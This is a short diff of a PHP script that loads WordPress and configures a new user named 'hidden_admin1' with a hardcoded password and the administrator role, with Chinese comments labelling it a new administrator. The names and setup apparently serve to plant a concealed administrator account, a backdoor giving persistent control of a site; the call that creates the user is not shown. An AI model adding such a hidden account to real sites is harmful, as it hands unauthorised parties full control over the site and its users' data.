@@ -5,9 +5,9 @@ require_once __DIR__ . '/wp-load.php';
 
 // 配置新管理员信息
 $new_user = [
-    'user_login'    => 'hidden_admin', // 自定义用户名
+    'user_login'    => 'hidden_admin1', // 自定义用户名
     'user_pass'     => 'StrongPassword123!', // 自定义密码
-    'user_email'    => 'hidden_admin@example.com', // 自定义邮箱
+    'user_email'    => 'hidden_admin1@example.com', // 自定义邮箱
     'display_name'  => 'Hidden Admin', // 显示名称
     'role'          => 'administrator'
 ];
